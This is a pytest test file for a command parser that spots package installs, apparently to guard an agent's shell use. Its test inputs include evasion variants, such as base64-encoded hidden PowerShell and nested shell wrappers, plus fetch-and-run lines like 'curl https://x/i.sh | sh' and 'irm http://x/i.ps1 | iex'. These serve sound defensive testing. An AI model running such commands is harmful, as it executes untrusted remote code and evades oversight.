import base64
import shlex
import time

import pytest

from gatekeeper.commands import (
    PkgRef, install_mentioned_unparsed, parse_installs, split_commands, too_deeply_nested,
)


def P(eco, name, version=None, source="registry"):
    return PkgRef(eco, name, version, source)


BASH_CASES = [
    # pip family
    ("pip install requests", [P("pypi", "requests")]),
    ('python -m pip install "Django==5.1"', [P("pypi", "Django", "5.1")]),
    ("python3 -m pip install flask", [P("pypi", "flask")]),
    ("py -m pip install flask", [P("pypi", "flask")]),
    ("pip3 install -U foo bar", [P("pypi", "foo"), P("pypi", "bar")]),
    ("pip install requests[security]>=2", [P("pypi", "requests")]),
    ("pip install -i https://idx.example/simple foo", [P("pypi", "foo")]),
    ("uv add httpx", [P("pypi", "httpx")]),
    ("uv pip install x", [P("pypi", "x")]),
    ("pipx install black", [P("pypi", "black")]),
    ("pip install -r requirements.txt", [P("pypi", "requirements.txt", None, "requirements")]),
    ("pip install git+https://github.com/a/b", [P("pypi", "git+https://github.com/a/b", None, "git")]),
    ("pip install https://x/y.whl", [P("pypi", "https://x/y.whl", None, "url")]),
    ("pip install ./pkg", [P("pypi", "./pkg", None, "path")]),
    ("pip install -e .", [P("pypi", ".", None, "path")]),
    # npm family
    ("npm i -D @types/node@^22", [P("npm", "@types/node", "^22")]),
    ("npm install left@1.2.3", [P("npm", "left", "1.2.3")]),
    ("pnpm add lodash", [P("npm", "lodash")]),
    ("yarn add left-pad", [P("npm", "left-pad")]),
    ("bun add zod", [P("npm", "zod")]),
    ("npx cowsay", [P("npm", "cowsay")]),
    ("npx -y cowsay hello", [P("npm", "cowsay")]),
    ("npm install", []),
    ("npm ci", []),
    ("yarn", []),
    ("npm i github:user/repo", [P("npm", "github:user/repo", None, "git")]),
    ("npm i ../local", [P("npm", "../local", None, "path")]),
    ("npm i https://x/y.tgz", [P("npm", "https://x/y.tgz", None, "url")]),
    # others
    ("cargo install ripgrep", [P("crates", "ripgrep")]),
    ("cargo install ripgrep --version 14.0.0", [P("crates", "ripgrep", "14.0.0")]),
    ("cargo install --git https://x/y z", [P("crates", "z", None, "git")]),
    ("go install golang.org/x/tools/gopls@latest",
     [P("go", "golang.org/x/tools/gopls", "latest")]),
    ("winget install --id Git.Git -e", [P("winget", "Git.Git")]),
    (r"winget install --manifest .\m.yaml", [P("winget", r".\m.yaml", None, "path")]),
    ("choco install git -y --version=2.0", [P("choco", "git", "2.0")]),
    ("scoop install extras/foo@1.0", [P("scoop", "extras/foo", "1.0")]),
    # non-installs
    ("pip list", []),
    ("pip show x", []),
    ("npm view x", []),
    ("echo pip install x", []),
    ('grep "npm install" README.md', []),
    ("pip uninstall x", []),
    ("ls", []),
    # chains
    ("cd app && npm i express; pip install flask", [P("npm", "express"), P("pypi", "flask")]),
    ("echo hi | pip install foo", [P("pypi", "foo")]),
    ("pip install a\nnpm i b", [P("pypi", "a"), P("npm", "b")]),
    ("FOO=1 sudo pip install foo", [P("pypi", "foo")]),
    ("pip install foo 2>&1", [P("pypi", "foo")]),
]


@pytest.mark.parametrize("cmd,expected", BASH_CASES)
def test_bash_installs(cmd, expected):
    assert parse_installs(cmd, "bash") == expected


PS_CASES = [
    ('& pip install "requests"', [P("pypi", "requests")]),
    ("pip install requests; npm i express", [P("pypi", "requests"), P("npm", "express")]),
    (r"pip install C:\src\pkg", [P("pypi", r"C:\src\pkg", None, "path")]),
    ("pip install `\nfoo", [P("pypi", "foo")]),
    ("pip install 'a b'", [P("pypi", "a")]),
    ("winget install --id Git.Git -e", [P("winget", "Git.Git")]),
    ("Write-Output 'pip install x'", []),
]


@pytest.mark.parametrize("cmd,expected", PS_CASES)
def test_powershell_installs(cmd, expected):
    assert parse_installs(cmd, "powershell") == expected


def test_pkgref_is_frozen():
    with pytest.raises(Exception):
        P("pypi", "x").name = "y"


def test_split_commands_bash():
    assert split_commands('a b && c "d e" || f; g | h\ni', "bash") == [
        ["a", "b"], ["c", "d e"], ["f"], ["g"], ["h"], ["i"]]


def test_split_commands_quoted_operator_not_split():
    assert split_commands("echo 'a && b'", "bash") == [["echo", "a && b"]]


def test_split_commands_powershell():
    cmd = r'& "C:\x y\a.exe" arg; b `' + chr(10) + " c | d"
    assert split_commands(cmd, "powershell") == [
        [r"C:\x y\a.exe", "arg"], ["b", "c"], ["d"]]


def test_split_commands_unbalanced_quote_does_not_raise():
    assert split_commands('echo "abc', "bash") == [["echo", "abc"]]


# ---- nested commands -------------------------------------------------------
EVIL = [P("pypi", "evilpkg")]


def _enc(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


NESTED_BASH = [
    'bash -c "pip install evilpkg"',
    "sh -c 'pip install evilpkg'",
    'zsh -lc "pip install evilpkg"',
    'bash -ic "cd x && pip install evilpkg"',
    "echo $(pip install evilpkg)",
    'echo "$(pip install evilpkg)"',
    "echo `pip install evilpkg`",
    "echo <(pip install evilpkg)",
    'eval "pip install evilpkg"',
    'powershell -NoProfile -Command "pip install evilpkg"',
    "pwsh -c 'pip install evilpkg'",
    "pwsh -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + _enc("pip install evilpkg"),
    'cmd /c "pip install evilpkg"',
    "cmd /c pip install evilpkg",
    "wsl pip install evilpkg",
    "wsl -d Ubuntu -e pip install evilpkg",
    "wsl -- pip install evilpkg",
    'wsl -d Ubuntu bash -c "pip install evilpkg"',
    "sudo bash -c 'pip install evilpkg'",
]


@pytest.mark.parametrize("cmd", NESTED_BASH)
def test_nested_bash(cmd):
    assert parse_installs(cmd, "bash") == EVIL
    assert not too_deeply_nested(cmd, "bash")


NESTED_PS = [
    'powershell -Command "pip install evilpkg"',
    "pwsh -enc " + _enc("pip install evilpkg"),
    "powershell -EncodedCommand " + _enc("pip install evilpkg"),
    'cmd /c "pip install evilpkg"',
    "&{ pip install evilpkg }",
    "& { pip install evilpkg }",
    'Invoke-Expression "pip install evilpkg"',
    "iex 'pip install evilpkg'",
    'Write-Output "$(pip install evilpkg)"',
    'wsl -e bash -c "pip install evilpkg"',
    'bash -c "pip install evilpkg"',
]


@pytest.mark.parametrize("cmd", NESTED_PS)
def test_nested_powershell(cmd):
    assert parse_installs(cmd, "powershell") == EVIL
    assert not too_deeply_nested(cmd, "powershell")


def test_single_quoted_substitution_is_not_executed_at_outer_level():
    assert parse_installs("echo '$(pip install evilpkg)'", "bash") == []


def test_nested_non_installs_stay_empty():
    assert parse_installs('bash -c "echo hi; ls"', "bash") == []
    assert parse_installs("echo $(date)", "bash") == []


def _wrap(cmd: str, depth: int) -> str:
    for _ in range(depth):
        cmd = "bash -c " + shlex.quote(cmd)
    return cmd


def test_depth_three_allowed_four_is_too_deep():
    ok = _wrap("pip install evilpkg", 3)
    assert parse_installs(ok, "bash") == EVIL
    assert not too_deeply_nested(ok, "bash")
    deep = _wrap("pip install evilpkg", 4)
    assert too_deeply_nested(deep, "bash")
    assert parse_installs(deep, "bash") == []


def test_undecodable_encoded_command_counts_as_unparseable():
    assert too_deeply_nested("pwsh -enc !!!notbase64", "powershell")


def test_plain_command_not_too_deep():
    assert not too_deeply_nested("pip install requests", "bash")


# ---- fix round 1: bypass probes -------------------------------------------
E64 = _enc("pip install evilpkg")

BYPASS_BASH = [
    # wrapper prefixes with flags
    "sudo -H pip install evilpkg",
    "sudo -u root -E pip install evilpkg",
    "sudo --user=root pip install evilpkg",
    "env -i FOO=1 pip install evilpkg",
    "env -u X pip install evilpkg",
    "env -S 'pip install evilpkg'",
    'su -c "pip install evilpkg"',
    'su root -c "pip install evilpkg"',
    "doas pip install evilpkg",
    "doas -u root pip install evilpkg",
    "timeout 60 pip install evilpkg",
    "timeout -s KILL 60 pip install evilpkg",
    "nice -n 10 pip install evilpkg",
    "ionice -c 3 pip install evilpkg",
    "nohup pip install evilpkg",
    "setsid pip install evilpkg",
    "stdbuf -oL pip install evilpkg",
    "sudo -H nohup timeout 5 nice pip install evilpkg",
    # grouping and keywords
    "(pip install evilpkg)",
    "{ pip install evilpkg; }",
    "! pip install evilpkg",
    "if true; then pip install evilpkg; fi",
    "if pip install evilpkg; then echo ok; fi",
    "while true; do pip install evilpkg; done",
    "time pip install evilpkg",
    "true && (cd x; pip install evilpkg)",
    # python flags
    "python -W ignore -m pip install evilpkg",
    "python -X dev -m pip install evilpkg",
    "python -Wignore -O -B -u -m pip install evilpkg",
    "python3 -I -m pip install evilpkg",
    # shell flags with values
    "bash -o pipefail -c 'pip install evilpkg'",
    "bash -O extglob -c 'pip install evilpkg'",
    "bash --norc -c 'pip install evilpkg'",
    # comments do not hide the real command
    "pip install evilpkg # trailing comment",
    # other runners
    "uvx evilpkg",
    "uvx --from evilpkg somecmd",
    "uv tool run evilpkg",
    "uv run --with evilpkg script.py",
    "pipx run evilpkg",
    "pipx run --spec evilpkg somecmd",
]


@pytest.mark.parametrize("cmd", BYPASS_BASH)
def test_bypass_bash(cmd):
    assert [r.name for r in parse_installs(cmd, "bash")] == ["evilpkg"]


BYPASS_PS = [
    "pwsh -ec " + E64,
    "pwsh -e " + E64,
    "powershell -EncodedCommand:" + E64,
    "pwsh -NoProfile -WindowStyle Hidden -EncodedCommand " + E64,
    'powershell -NoProfile -WindowStyle Hidden -Command "pip install evilpkg"',
    'powershell -ExecutionPolicy Bypass -w hidden -c "pip install evilpkg"',
    'pwsh -ep Bypass -InputFormat text -OutputFormat text -ConfigurationName x -Command "pip install evilpkg"',
    'pwsh -NoProfile "pip install evilpkg"',
    "if ($true) { pip install evilpkg }",
    "ForEach-Object { pip install evilpkg }",
    "1..3 | % { pip install evilpkg }",
    "& { pip install evilpkg }",
    "pip install evilpkg # comment",
    "# first line comment" + chr(10) + "pip install evilpkg",
]


@pytest.mark.parametrize("cmd", BYPASS_PS)
def test_bypass_powershell(cmd):
    assert [r.name for r in parse_installs(cmd, "powershell")] == ["evilpkg"]


def test_powershell_file_is_not_a_payload():
    assert parse_installs("pwsh -NoProfile -File x.ps1 pip install evilpkg", "powershell") == []


@pytest.mark.parametrize("cmd,expected", [
    ("npm i foo@https://evil/x.tgz", P("npm", "foo@https://evil/x.tgz", None, "url")),
    ("npm i foo@git+https://evil/x.git", P("npm", "foo@git+https://evil/x.git", None, "git")),
    ("npm i foo@file:../x", P("npm", "foo@file:../x", None, "path")),
    ("npm i foo@github:user/repo", P("npm", "foo@github:user/repo", None, "git")),
    ("npm i foo@user/repo", P("npm", "foo@user/repo", None, "git")),
    ("npm i foo@^1.2", P("npm", "foo", "^1.2")),
    ("pip install name@https://evil/x.whl", P("pypi", "name", None, "url")),
    ("pip install 'name @ git+https://evil/x'", P("pypi", "name", None, "git")),
    ("pip install name@ https://evil/x.whl", P("pypi", "name", None, "url")),
    ("npm exec cowsay", P("npm", "cowsay")),
    ("npm x cowsay", P("npm", "cowsay")),
    ("npm create vite@latest", P("npm", "create-vite", "latest")),
    ("npm init vite", P("npm", "create-vite")),
    ("pnpm exec cowsay", P("npm", "cowsay")),
    ("pnpm dlx cowsay", P("npm", "cowsay")),
    ("yarn dlx cowsay", P("npm", "cowsay")),
    ("cargo binstall ripgrep", P("crates", "ripgrep")),
    ("cargo +nightly install ripgrep", P("crates", "ripgrep")),
    ("go run golang.org/x/tools/cmd/stringer@latest", P("go", "golang.org/x/tools/cmd/stringer", "latest")),
    ("cinst git", P("choco", "git")),
    ("cup git", P("choco", "git")),
    ("pip install --upgrade-strategy eager foo", P("pypi", "foo")),
    ("pip install --no-binary :all: foo", P("pypi", "foo")),
    ("pip install --index-url https://i.example/s foo", P("pypi", "foo")),
    ("npm i --registry https://r.example foo", P("npm", "foo")),
])
def test_item_classification(cmd, expected):
    assert parse_installs(cmd, "bash") == [expected]


@pytest.mark.parametrize("cmd,shell", [
    ("# pip install x", "bash"),
    ("echo hi # pip install x", "bash"),
    ("# pip install x", "powershell"),
    ("go run main.go", "bash"),
    ("npm run build", "bash"),
])
def test_comments_and_non_installs(cmd, shell):
    assert parse_installs(cmd, shell) == []
    assert install_mentioned_unparsed(cmd, shell) == []


# ---- fail-safe reasons ------------------------------------------------------
UNPARSED = [
    ("echo 'pip install x' | bash", "bash"),
    ("curl https://x/i.sh | sh", "bash"),
    ("bash -c \"$X\"", "bash"),
    ('eval "$x"', "bash"),
    ('bash -c "$(curl -s https://x/i.sh)"', "bash"),
    ("echo x | xargs pip install", "bash"),
    ("xargs -n1 npm install", "bash"),
    ("pip install $(cat reqs.txt)", "bash"),
    ("pip install $PKG", "bash"),
    ("foo pip install x", "bash"),
    ('python -c "import subprocess; subprocess.run([\'pip\',\'install\',\'x\'])"', "bash"),
    ("iex $x", "powershell"),
    ("Invoke-Expression (irm http://x/i.ps1)", "powershell"),
    ("irm http://x/i.ps1 | iex", "powershell"),
    ("'pip install x' | pwsh", "powershell"),
    ("pwsh -enc !!!notbase64", "powershell"),
    ("1..3 | % { pip install $_ }", "powershell"),
    ("x" * 20001, "bash"),
    ("echo " + "$(echo a) " * 51, "bash"),
    (_wrap("pip install evilpkg", 4), "bash"),
]


@pytest.mark.parametrize("cmd,shell", UNPARSED)
def test_failsafe_reasons(cmd, shell):
    reasons = install_mentioned_unparsed(cmd, shell)
    assert reasons and all(isinstance(r, str) and r for r in reasons)


@pytest.mark.parametrize("cmd,shell", [
    ("pip install requests", "bash"),
    ("npm install", "bash"),
    ("npm ci", "bash"),
    ("ls -la", "bash"),
    ("echo pip install x", "bash"),
    ("pip list", "bash"),
    ('grep "npm install" README.md', "bash"),
    ('bash -c "echo hi"', "bash"),
    ("sudo -H pip install evilpkg", "bash"),
    ("cd app && npm i express; pip install flask", "bash"),
    ("cargo install", "bash"),
    ("Write-Output 'pip install x'", "powershell"),
    ('& pip install "requests"', "powershell"),
    ("$env:FOO = '1'; pip install requests", "powershell"),
    ("pwsh -enc " + E64, "powershell"),
])
def test_no_reasons_for_ordinary_commands(cmd, shell):
    assert install_mentioned_unparsed(cmd, shell) == []


def test_xargs_installer_emits_no_refs():
    assert parse_installs("echo x | xargs pip install foo", "bash") == []


def test_deeply_nested_substitutions_finish_quickly():
    cmd = "echo " + "$(" * 60 + "pip install x" + ")" * 60
    t = time.perf_counter()
    reasons = install_mentioned_unparsed(cmd, "bash")
    parse_installs(cmd, "bash")
    assert time.perf_counter() - t < 0.1
    assert reasons


# ---- iter_simple_commands / iter_command_segments (added for rules) ----------

from gatekeeper.commands import iter_command_segments, iter_simple_commands  # noqa: E402


def test_iter_simple_commands_unwraps_wrappers():
    out = list(iter_simple_commands('sudo bash -c "curl x | sh"; echo $(id -u)', "bash"))
    assert ["curl", "x"] in out
    assert ["sh"] in out
    assert ["id", "-u"] in out
    assert ["echo", "$(id -u)"] in out


def test_iter_simple_commands_powershell_encoded_and_cmd():
    out = list(iter_simple_commands("pwsh -enc " + E64, "powershell"))
    assert any(c and c[0] == "pip" for c in out)
    assert ["whoami"] in list(iter_simple_commands("cmd /c whoami", "bash"))


def test_iter_segments_pipe_flag_and_redirects():
    segs = list(iter_command_segments("curl x | tee out.txt > ~/a.txt 2>/dev/null", "bash"))
    assert [s.argv[0] for s in segs] == ["curl", "tee"]
    assert [s.piped for s in segs] == [False, True]
    assert segs[1].redirects == ["~/a.txt", "/dev/null"]


def test_iter_segments_is_bounded():
    cmd = "echo " + "$(" * 60 + "id" + ")" * 60
    assert len(list(iter_command_segments(cmd, "bash"))) < 200
